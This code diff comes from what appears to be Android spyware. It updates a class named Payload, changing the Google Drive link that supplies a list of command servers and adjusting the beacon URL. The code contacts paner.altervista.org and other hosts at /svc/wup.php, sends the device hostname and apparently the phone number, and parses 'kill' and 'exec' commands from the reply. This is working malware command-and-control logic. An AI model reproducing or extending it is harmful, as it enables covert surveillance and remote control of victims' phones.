@@ -118,8 +118,8 @@ public class Payload extends JobService {
         List<String> sites = new ArrayList<String>();
         sites.add("paner.altervista.org");
         try {
-            result = getResponseFromUrl("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF");
-
+            //result = getResponseFromUrl("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF");
+            result = getResponseFromUrl("https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny");
             String[] myarray = result.split(",", -1);
             for (String site : myarray) {
 
@@ -167,8 +167,8 @@ public class Payload extends JobService {
                     for (String site : sites) {
                         try {
                             hostname = getHostName("Android");
-                            result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname+"&nome="+tel);
-
+                            //result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname+"&nome="+tel);
+                            result = getResponseFromUrl(site + "/svc/wup.php?pc=" + hostname+"&nome="+tel);
                             String[] array = result.split("\\|\\|", -1);
                             String kill=array[3].substring(5);
                             String exec=array[7].substring(5);
